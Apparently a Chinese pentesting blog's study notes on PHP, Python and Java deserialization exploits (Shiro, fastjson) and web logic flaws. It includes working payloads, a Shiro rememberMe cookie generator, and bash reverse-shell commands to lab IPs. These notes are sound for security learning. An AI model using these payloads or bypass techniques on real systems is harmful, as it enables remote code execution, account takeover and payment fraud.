$str=file_get_contents(&#x27;./stu.txt&#x27;); $stu=unserialize($str); print_r($stu);?&gt; 对象的序列化和反序列化： 12345678910111213141516171819&lt;?php class Student &#123; public $name; protected $sex; private $add; public function __construct($name, $sex, $add)&#123; $this-&gt;name=$name; $this-&gt;sex=$sex; $this-&gt;add=$add; &#125; &#125; // 测试 $stu=new Student(&#x27;tom&#x27;, &#x27;男&#x27;, &#x27;北京&#x27;); // 序列化 $str=serialize($stu); file_put_contents(&#x27;./stu.txt&#x27;, $str);?&gt; 123456&lt;?php // 反序列化 $str=file_get_contents(&#x27;./stu.txt&#x27;); $stu=unserialize($str); var_dump($stu);?&gt; pythonPython中序列化一般有两种方式: pickle模块和json模块, 前者是Python特有的格式, 后者是json通用的格式. pickle有如下四种操作方法： 1234dump 对象序列化到文件对象并存入文件dumps 对象序列化为 bytes 对象load 对象反序列化并从文件中读取数据loads 从 bytes 对象反序列化 实例： 123456789import pickleclass Demo(): def init(self, name=&#x27;h3rmesk1t&#x27;): self.name = nameprint(pickle.dumps(Demo()))# 序列化输出为b&#x27;\\x80\\x04\\x95/\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Demo\\x94\\x93\\x94)\\x81\\x94&#125;\\x94\\x8c\\x04name\\x94\\x8c\\th3rmesk1t\\x94sb.&#x27;print(pickle.loads(pickle.dumps(Demo())).name)# 反序列化输出为 h3rmesk1t python反序列化漏洞原理： python反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。类似于PHP中的__wakeup()方法。 payload: 12345678910import osimport pickleclass Demo(object): def __reduce__(self): shell = &#x27;/bin/sh&#x27; return (os.system,(shell,))demo = Demo()pickle.loads(pickle.dumps(demo)) # 反序列化创建对象时调用__reduce__，执行恶意代码 魔术方法序列化或反序列化的过程中会自动调用一些魔术方法。 php 中 magic函数命名是以符号“__”开头的 123456789101112131415161718192021__construct：当一个对象创建时调用（constructor）__destruct：当一个对象被销毁时调用（destructor）__invoke()：当把一个类当作函数使用时自动调用__toString：当一个对象被当作一个字符串处理时自动调用__sleep：在使用serialize()函数时，程序会检查类中是否存在一个__sleep()魔术方法。如果存在，则该方法会先被调用，然后再执行序列化操作。__wakeup：在使用unserialize()时，会检查是否存在一个__wakeup()魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。__call()：在对象中调用一个不存在或者不可访问方法时，__call会被调用。__set()：给不可访问属性赋值时，__set会被调用。__isset()：对不可访问属性调用isset()或empty()时，__isset()会被调用。__unset()：对不可访问属性调用unset()时，__unset()会被调用。__get()：读取不可访问属性的值时，__get会被调用。 漏洞成因PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。 PHP反序列化漏洞的形成的根本原因是程序没有对用户输入的序列化字符串进行检测，导致反序列化过程可以被恶意控制（执行魔术方法），进而造成代码执行（XSS等）、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。 Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。如果用户自定义了一些恶意数据在序列化字符串中，在反序列化为对象时，其中的变量被用于命令执行等操作，就会造成反序列化漏洞。 注意：反序列化对象时，不会调用对象的构造函数，因为是反序列化得来的。但是在程序结束时会调用对象的析构函数。 利用方式利用条件 反序列化函数中的参数可控（Java反序列化等） 存在可利用的类，且类中有魔术方法（php、python反序列化等） 例如，有如下PHP实例： 1234567891011121314&lt;?php class test&#123; var $id = &#x27;Baize&#x27;; function __wakeup()&#123; eval($this-&gt;id); &#125;&#125;$test1 = $_GET[&#x27;string&#x27;];$test2 = unserialize($test1);?&gt; 可以确定可控参数是GET型string参数，并且后端接收参数后会进行反序列化操作。同时，test类中存在__wakeup魔术方法，操作是eval($id)。 那么我们思路是：构造test类的序列化字符串，使得反序列化后的$id值为要执行的操作（代码执行漏洞），例如我们要执行phpinfo()，那么可以构造这样一个字符串： 1O:4:&quot;test&quot;:1:&#123;s:2:&quot;id&quot;;s:10:&quot;phpinfo();&quot;&#125; 这样反序列化会时就会自动调用__wakeup魔术方法，即执行eval(phpinfo();)。 POP链构造（php）其实实际中基本不会有上述实例这种这么简单的利用过程，更多的则是需要通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。关注整个函数的调用过程中参数的传递情况，找到可利用的点。 **POP CHAIN(POP链)**： 通过用户可控的反序列化操作，其中可触发的魔术方法为出发点，在魔术方法中的函数在其他类中存在同名函数，或通过传递，关联等可以调用的其他执行敏感操作的函数，然后传递参数执行敏感操作，即 用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作 实例1test.php内容如下： 12345678910111213141516171819202122232425262728293031&lt;?php class Test1&#123; protected $obj; function __construct()&#123; $this-&gt;obj = new Test3; &#125; function __toString()&#123; # 如果$obj变量存在则返回调用$obj对象中的Delete()函数 if (isset($this-&gt;obj)) return $this-&gt;obj-&gt;Delete(); &#125; &#125; class Test2&#123; # 存在任意文件删除的漏洞 public $cache_file; function Delete()&#123; # 如果定义的$file变量中的文件存在，则删除此文件并返回提示内容 $file = “/var/www/html/cache/tmp/&#123;$this-&gt;cache_file&#125;”; if (file_exists($file))&#123; @unlink($file); &#125; return &#x27;I am a evil Delete function&#x27;; &#125; &#125; class Test3&#123; function Delete()&#123; return &#x27;I am a safe Delete function&#x27;; &#125; &#125; $user_data = unserialize($_GET[&#x27;data&#x27;]); echo $user_data;?&gt; 代码分析： 首先我们看最先执行的操作在最下面反序列化GET到的参数data，然后执行echo，这里如果$user_data是一个类实例化来的对象的话，就是将对象作为字符串输出，会触发对象中的__tostring()魔术方法。 而源码中有三个类，各个类具有不同的方法。 POP链构造：首先出发点是Test1中的__tostring()魔术方法，其中调用了$this-&gt;obj中的Delete()函数，而$this-&gt;obj在实例化对象时会触发__construct方法，将$this-&gt;obj作为实例化Test3类的对象，那么此时调用的就是Test3类中的Delete()函数，只返回一句提示，那么此时的执行流如下： 实例化Test1类的对象→__construct()→$this-&gt;obj=new Test3→输出该对象时调用__tostring()→Test3的Delete()方法 不过在Test2类中也定义了和Test3中同名的函数Delete()，该方法可能造成任意文件删除。那么我们可以通过构造特定的反序列化参数来修改执行流，也就是构造我们自己的POP链，在反序列化后使用Test2类中的Delete()来执行敏感操作，让执行流如下: 实例化Test1类的对象→__construct()→$this-&gt;obj=new Test2→输出该对象时调用__tostring()→Test2的Delete方法 那么POP链的构造就是通过反序列化和echo来触发__tostring()魔术方法，并且此方法中调用Test2中的Delete()方法，造成任意文件删除的危害。 POC如下： 123456789101112131415&lt;?php class Test1&#123; protected $obj; function __construct()&#123; $this-&gt;obj = new Test2; &#125; &#125; class Test2&#123; public $cache_file = &#x27;../../../../test.php&#x27;; &#125; $evil = new Test1(); echo urlencode(serialize($evil));?&gt; java反射机制反射 (Reflection) 是 Java 的特征之一，它允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。通过反射，我们可以在运行时获得程序或程序集中每一个类型的成员和成员的信息。通过Java 反射机制，我们可以动态地创建对象并调用其属性，这样的对象的类型在编译期是未知的。 反射的核心是 JVM 在运行时才动态加载类或调用方法&#x2F;访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。 Java 反射主要提供以下功能： 在运行时判断任意一个对象所属的类；在运行时构造任意一个类的对象；在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；在运行时调用任意一个对象的方法重点：是运行时而不是编译时 反射机制在java反序列化漏洞的利用过程中有很重要的作用。 java反序列化利用Java 序列化过程依赖于 ObjectOutputStream 类中 writeObject 方法，而反序列化的过程是依赖于 ObjectOutputStream 类中 readObject 方法。若用户重写了自定义的 readObject 方法，那么就有可能产生反序列化的时候命令执行的漏洞点。或者用户精心构造恶意的类的序列化字符串，那么在反序列化实例化这个类时就会执行其中的恶意代码（比如rmi远程代码）。 利用java反射重写 readObject 方法： 反射机制的存在使得我们可以越过Java本身的静态检查和类型约束，在运行期直接访问和修改目标对象的属性和状态。Java反射的四大核心是 Class，Constructor，Field，Method。通过反射的方法重写readObject： 123456789101112131415161718//ReflectionCalcObject.javapackage com.l1nk3r.reflect;import java.io. * ;import java.lang.reflect.Method;class ReflectionCalcObject implements Serializable &#123; public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in ) throws IOException, ClassNotFoundException &#123; in .defaultReadObject(); //调用原始的readOject方法 try &#123; //通过反射方法执行命令； Method method = java.lang.Runtime.class.getMethod(“exec”, String.class); Object result = method.invoke(Runtime.getRuntime(), “open / Applications / Calculator.app / “); &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 通过运行 java.lang.Runtime 这个类的 .class 属性，并使用 getMethod 方法来获取我们要执行命令的方法 exec ，最后我们通过 invoke 来实现注册这个方法，打开计算器。 防御 最有效的方法是不接受来自不受信任源的序列化对象或者只使用原始数据类型的序列化，但这不容易实现。 完整性检查，如：对序列化对象进行数字签名，以防止创建恶意对象或序列化数据被篡改。 在创建对象前强制执行类型约束，因为用户的代码通常被期望使用一组可定义的类。 绕过__wakeup()函数绕过只要序列化的中的成员数大于实际成员数，__wakeup()魔术方法将不会被执行，从而导致绕过。 注意，需要PHP版本&lt;&#x3D;5.6.25或者PHP版本&lt;&#x3D;7.0.11。 举一个简单的例子，考虑一个使用序列化User对象的网站，该网站将有关用户会话的数据存储在cookie中。如果攻击者在HTTP请求中发现了序列化对象，则可能会对其进行解码以找到以下内容： 1O:4:&quot;User&quot;:2:&#123;s:8:”username”:s:6:”carlos”; s:7:”isAdmin”:b:0;&#125; 注意到这里的isAdmin属性，攻击者可以简单地将该属性的布尔值更改为1(true)，重新编码对象，然后使用此修改后的值覆盖其当前cookie。 以及，修改 实例参考：https://www.freebuf.com/articles/web/286442.html shiro反序列化漏洞https://blog.csdn.net/huangyongkang666/article/details/124175812 原理低版本的apache shiro （ &lt;&#x3D; 1.2.4版本）默认使用了CookieRememberMeManager。当用户勾选RememberMe并登录成功，Shiro会将用户的cookie值序列化，AES加密，接着base64编码后存储在cookie的rememberMe字段中。而服务端接收到cookie后：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码在源码中的，所以当攻击者知道了AES key后，就能够构造恶意的rememberMe cookie值从而导致反序列化的RCE漏洞。 利用条件返回包中含有rememberMe&#x3D;deleteMe字段 用到的工具 ysoserial ysoserial集合了各种java反序列化payload，下载地址为https://github.com/frohoff/ysoserial。 安装过程： 123git clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -D skipTests //需要安装maven才能使用mvn命令 shiro_tool.jar 集成化工具，下载地址为https://toolaffix.oss-cn-beijing.aliyuncs.com/shiro_tool.jar。 可用于获取目标IP的shiro中是否存在默认的AES密钥。命令如下： 1java -jar shiro_tool.jar http://192.168.241.129:8080 1kPH+bIxk5D2deZiIxcaaaA== 漏洞利用 测试能否使用rememberMe字段 使用burp抓取当前页面数据包，在cookie中添加rememberMe&#x3D;1。若响应包中显示Set-Cookie: rememberMe&#x3D;deleteMe，说明存在shiro框架，可能存在漏洞。 监听并构造反弹shell 通过 ysoserial 中的 JRMP 监听模块，监听4444端口并执行反弹shell命令。 反弹shell命令： 123bash -i &gt;&amp; /dev/tcp/192.168.241.128/4444 0&gt;&amp;1 //需要base64编码，在线编码http://www.jackson-t.ca/runtime-exec-payloads.htmlbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MS4xMjgvNDQ0NCAwPiYx==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MS4xMjgvNDQ0NCAwPiYx==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; 单引号中的就是要执行的命令 构造payload 利用检测出的AES密钥，生成payload: 12345678910111213141516171819202122# python2import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): # shellcode popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;ysoserial.jar&#x27;, &#x27;JRMPClient&#x27;, command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) # AES密钥 iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &#x27;__main__&#x27;: payload = encode_rememberme(sys.argv[1]) print (&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())) 执行上述代码：python shiro.py 192.168.241.129:6666，得到payload，即恶意的rememberMe。 开启nc监听 1nc -lnvp 6767 抓包，插入恶意rememberMe 抓包，在cookie中将上面恶意构造的rememberMe发送出去： 成功getshell fastjson反序列化漏洞原理fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。 在Java 8u102环境下，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。 用到的工具预先安装maven并配置环境变量，下载marshalsec，进入marshalsec 目录，使用mvn clean package -DskipTests命令编译出marshalsec的jar包 漏洞利用 生成payload 1234567891011121314151617// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile &#123; static &#123; try &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.2.101/6767 0&gt;&amp;1&quot;&#125;; Process pc = rt.exec(commands); pc.waitFor(); &#125; catch (Exception e) &#123; // do nothing &#125; &#125;&#125; 进行编译生成.class文件。搭建服务，要测试能直连TouchFile.class ，才会执行文件里的命令。 开启rmi服务 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.2.101:4444/#TouchFile&quot; 9999 其中http://192.168.2.101:4444为你的rmi服务器的地址，9999为rmi监听的端口 开启nc监听，6767为监听的端口 1nc -lnvp 6767 发包 获得shell","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"逻辑漏洞","slug":"渗透测试/12. 逻辑漏洞","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:02:19.325Z","comments":true,"path":"posts/[object Object]/渗透测试/12. 逻辑漏洞/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/undefined","excerpt":"","text":"逻辑漏洞参考：https://www.freebuf.com/vuls/281141.html 身份验证漏洞暴力破解漏洞攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作。 原理由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举。 漏洞点系统登录点 修复对于固定用户名爆破密码，可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码。但是不能永久锁定，可能被用来进行账户恶意锁定； 对于固定密码枚举用户名、 需要计算IP对URL的请求情况，若某个IP短时间大量请求登录则应该加入黑名单，对传输数据进行加密有一定的防护效果。 Session固定攻击会话固定攻击是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人 。 原理在请求登录过程时候，URL带有一个session，登录成功之后会将登录成功的信息绑定到这个session中，攻击者可以发送带有session的URL给相关工作人员诱导其登录，相当于获取了其身份信息。 漏洞点在GET方法请求登录时候带有session值。 修复避免在URL中带入session信息。 另外也要注意POST请求中带有sessionid进行session固定攻击，虽然可利用性比较低，但是建议修复。 cookie欺骗通过伪造cookie信息能够伪造其他用户进行登录。 原理开发者为了方便将身份信息&#x2F;登录信息明文或者只是简单编码、哈希之后存放在cookies中，网站通过获取得到的cookies进行授权或者身份验证。 漏洞点cookie中有明显或者只是简单编码、哈希的字段时候，比如修改lsLogin值为1可以判定为用户已经登录，修改cookie为asp163&#x3D;UserName&#x3D;admin可以获得管理员权限。 修复Cookie不应该存储可理解的身份信息和登录信息 按照规定，cookie对身份信息和登录信息的存储只能通过存储足够长度的随机字符串进行，避免篡改。 逻辑越权漏洞参考： https://blog.csdn.net/huangyongkang666/article/details/123629813 https://www.freebuf.com/articles/web/195837.html 原理越权访问（Broken Access Control，BAC），指应用在检查授权时存在漏洞，使得攻击者在获得低权限用户账号后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限的用户。 成因开发人员在对数据进行增删查改时，对客户端请求的数据过分相信而遗漏了权限的判定，权限验证不当而导致的越权行为。 通常情况下，一个 Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果验证权限不足，便会导致越权。常见的程序都会认为通过登录后即可验证用户的身份，从而不会做下一步验证，最后导致越权。 隐藏URL 直接对象引用 多阶段功能 静态文件 平台配置错误 分类水平越权水平越权是指攻击者尝试访问与他具有相同权限的用户资源。 形成原因：在进行方法调用的时候未验证请求用户和目标信息拥有者是否匹配一致，而是直接用userid&#x2F;email之类的容易遍历的参数进行数据库查询，导致攻击者利用了其他人的userid。 比如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的行为就叫做水平越权访问。 修复：利用getAttribute(“userid”)获取其userid，而不是直接接收userid参数，避免了userid参数传输。 以下是常出现的水平越权的几种场景： 基于用户身份ID 在使用某个功能时，通过用户提交的身份ID（用户ID、账号、手机号、证件号等用户唯一标识）来访问或操作对应的数据。 基于对象ID 在使用某个功能时，通过用户提交的对象ID（如订单号、记录号）来访问或操作对应的数据。 基于文件名 在使用某个功能时，通过文件名直接访问文件，最常见于用户上传文件的场景。 垂直越权垂直越权是指低权限用户尝试访问高权限用户的资源。 形成原因：由于后台应用没有做权限控制、角色校验，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。 主要有以下两种场景： 未认证账号，访问无需认证就能访问该功能 不具备某个功能权限的账户，认证后能成功访问该功能 未授权访问游客能够访问普通用户甚至超级管理员才能访问的系统信息或者系统功能， 产生原因：系统设计期间没有进行全局用户身份校验；或者校验存在缺陷。 业务数据篡改概念：篡改一些参数的数值，达到获利的目的。 若是篡改验证用的判断参数，比如判断用户类型的userType，可能用于实现垂直越权； 若是篡改用户参数，比如手机号、身份证号，可能用于实现水平越权。 漏洞点：抽奖、购买、转账、返现等功能。 修复： 计算传输数据的哈希，并将哈希附加在传输数据中作为校验值，避免被篡改。 设置token。 执行顺序逻辑漏洞概念：也是篡改参数，但是是通过篡改分步逻辑中的步骤数字，达到绕过支付、校验等效果。 原理：程序逻辑分布进行，但是对步骤、验证信息、支付信息没有做好严格校验，导致修改步骤就直接绕过验证或者支付。 漏洞点：任何分布逻辑且带步骤数字，或者利用JS进行步骤控制的功能中。 修复： 在请求最后一步时候需要带入前面的验证信息，服务端再进行一次校验信息的验证，验证正确方能继续执行数据操作； 也可以通过getAttributr(“userid”)获取userid进行userid和验证结果绑定，最后一步不带入验证信息，但是仍然要获取userid进行校验； 再最后一步通过验证之后或者服务器收到支付信息后再生成相应的数据交给用户。 验证码爆破概念：抓包后重放，进行参数值遍历。可以用于突破图形验证码的验证，可以实现如登录爆破、个人信息爆破、验证码绕过等攻击。 修复： 验证码使用后立即重新生成 设置验证码有效期 验证码的部分仅使用图片，不使用字符串 不进行分布校验，而是连同请求数据一起发送到目标服务器进行校验 找回密码概念：攻击者通过密码找回逻辑漏洞，可以重置他人账号密码，危害他人账号安全。 通过验证码找回密码的话，可以分为验证码漏洞的一种。 短信轰炸实现：通过数据包重放实现。 原理：后台未进行相关操作的计数导致数据包重放。 其他逻辑漏洞条件竞争漏洞概念：可以通过同时重放大量数据包进行漏洞利用，通常用于突破限量、限额的问题都有奇效。 原理：由于目标函数中，判断与数据修复两个步骤之间，或者两个数据修改步骤之间存在时间差，且函数未进行同步锁定，则可以造成漏洞。 漏洞点：程序中存在限制，可以猜测到后台有判断与修改操作的方法 修复：使用synchronized关键字，可以限制同一时间内访问方法的只有单一线程 并不是每个条件竞争都必须修复。 数据包重放漏洞概念：通过数据包重放，可以造成短信轰炸、邮件轰炸、重复提交订单等。 原理：后台未进行相关操作的计数导致数据包重放。 漏洞点：短信验证码、邮件校验、提交订单等功能。 修复：（针对短信、邮件） 构造一个Hashmap&lt;String，short&gt;，存放邮箱或电话号码及对应次数，只要某个邮箱或者电话号码次数够了，就不能继续发送了；或者计算两次发送的时间间隔，时间过短就不继续发送了 通用修复方案： 需要建立token机制或验证码机制，一次有效。 参数绑定漏洞概念：通过添加对象字段相关参数进行数据篡改 原理：对象自动绑定被许多框架支持，它允许将HTTP请求参数自动的绑定到对象，开发者没有对其进行安全校验则容易导致数据篡改。 漏洞点：常见的所有输入的地方都会出现这个漏洞，特别是金融、用户、缓存等。 修复：Spring MVC中可以使用@InitBinder注释，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数。 举例（出现位置）逻辑漏洞的问题可以分为前端和后端两个部分，总体思路都是先测试前端再测试后端。 注册处注册功能可能出现任意用户注册、短信轰炸等问题。 以手机注册为例： 前端参数验证的漏洞注册时BP抓包，查看每个返回包有没有返回手机验证码或者存在true、false之类的判断语句，尝试将false修改为true，成功注册的话就绕过了前端验证。 拦截返回的响应包： 任意用户添加在未登录或者低权限的的情况下，利用数据包添加任意用户。 短信轰炸漏洞尝试重放发送验证码的包，查看手机是否在短时间内收到了多条短信，是的话则存在短信轰炸漏洞，这是因为后端没有对发送手机短信做时间限制。 修改发送包手机号首先用自己的手机收到正确验证码，在点击注册时拦截包将手机号改为其他手机号，如果成功的话就注册了别人的手机号，这是因为后端仅验证了验证码是否是正确的而没有验证验证码是否与手机匹配。 登陆处登录处可能出现任意用户登录、验证码可绕过、用户账号可撞库等问题。 以手机验证码登录举例： 前端对比正确登录和错误登录的包，对比返回包看是否有判断，尝试修改参数绕过前端验证。 修改cookie实现垂直越权cookie的构造过于简单，可以分析出一部分参数，且通过前端JS文件可以判断出对该参数的校验。 比如发现前端文件内容如下： 12345function setCookie() //login_ok.htm use&#123; document.cookie=&quot;login=1&quot;; MM_goToURL(&#x27;parent&#x27;, &#x27;home.htm&#x27;);&#125; 那么将Cookie中的 login&#x3D;1 则会以管理员身份跳转 home.html，成功绕过登录。 短信轰炸与注册处测试步骤一样 验证码爆破包括图片验证码和手机验证码。 先测试图片验证码，将使用正确验证码登录的包再重放一次，如果回显还是正确登录的话说明并没有对图片验证码进行限制，可以尝试撞库。 至于手机验证码，通常是尝试爆破，如果网站发到手机上的短信没有写什么在xx时间内有效之类的则有可能没有时间限制，将登录包右键发送至Intruder（即测试器模块）设置好爆破位置后在载荷里选择数值后这样填写。 通常范围是填写正确验证码所在的范围，爆破出来后就可以登录用户，对应着任意用户登录漏洞。 修改发送包手机号修改发送包手机号则和上面注册处修改发送包手机号步骤一样，不同的是上面注册处是为了测试任意用户注册，而这里登录处是为了测试任意用户登录，原理一样目的不同。 修改用户参数查看正确登录包的返回包是否有用户id之类的参数，尝试修改该参数。（不嫌麻烦的话可以用两个正确登录的返回包对比） 拦截该请求的返回包修改返回包中的用户参数。 密码找回处密码找回处可能出现任意用户密码找回、验证码可绕过等问题。 以手机验证码找回为例： 前端同样是修改返回包看是否能跳过验证步骤。 验证码爆破验证码爆破与上面登录处的验证码爆破操作一致。 修改发送包手机号与上面注册处的修改发送包手机号操作一致 支付与越权 可以使用两个账号来对比测试，这样可以更快发现可疑参数。 支付接口指的是网站支付一般会有像微信支付、支付宝支付这种，一般网站会在支付的发送包里用某个参数标识。 登录时查看并测试用户信息返回接口指的是，在登录的时候，有的网站有个返回包是一个json数据包，该包内包含了用户敏感信息，此时就可以尝试修改发送包的用户参数，说不定就能获取其他用户的敏感信息。 权限框架缺陷权限控制框架是实现权限控制功能的基础（例如shiro），如果权限控制框架本身存在缺陷，那么就会导致权限控制功能完全失效。 SRC中逻辑漏洞总结 注册： 短信轰炸 验证码安全问题 密码爆破 邮箱轰炸 用户任意注册、批量注册 用户名枚举 XSS（有框的地方就可以尝试插XSS） 登录： 短信轰炸、验证码安全问题、密码爆破、邮箱轰炸 SQL注入 撞库 抓包把password字段修改为空值发送 认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号 Cookie仿冒 修改返回包的相关数据，可能会登陆到其他的用户 找回密码： 短信邮箱轰炸、短信邮箱劫持 重置任意用户账户密码、验证码手机用户未统一验证 直接跳过验证步骤 购买支付、充值（要利用抓包去仔细查看每一个可用的参数） 交易金额、数量修改、更换支付模块（比如更换支付的模块金额） 交易信息订单编码&#x2F;导致信息泄露 整数溢出，int最大值为2147483647，超过最大值 修改充值账户 支付绕过 抽奖活动 刷奖品、积分 并发 优惠卷、代金卷 并发逻辑漏洞（burp批量获取优惠券） 修改优惠券金额、数量 订单信息 订单信息遍历、泄露 订单信息泄露导致用户信息泄露 删出他人订单 会员系统 修改个人信息上传文件，上传带弹窗的html 如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测 图片上传也可能遇到imagereagick命令执行，上传恶意图片 视频上传如果使用ffmpeg&lt;3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf 用户横向越权访问、遍历、导致用户信息泄露 SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS 传输过程 明文传输账户密码 修改信息处无session&#x2F;token导致csrf POST&#x2F;COOKIE注入 评论 POST注入 存储型XSS 无session&#x2F;token导致CSRF 验证码问题 万能验证码 返回包中存在验证码 删除验证码或者cookie中的值可以爆破账号密码 短信轰炸 一直重放 删除修改cookie，重放数据包 遍历参数发送数据包 手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包 请求参数修改大小写，或者添加请求参数比如&amp;id&#x3D;1 一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口 如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显 水平越权 主要登陆后还是修改参数，主要找到多个接口不断测试 关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测 多个账号，主要分析请求参数 数据泄露 在找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回 任意用户密码重置 目前大部分都是在修改密码处参数修改 有些是前端验证 支付逻辑漏洞 边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户 顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。 金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包 确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。 请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。 请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。 订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。 欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家 单位替换：产生在paypal类似的国际支付的场景。 用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西 强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。 秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。 函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。 heart bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。 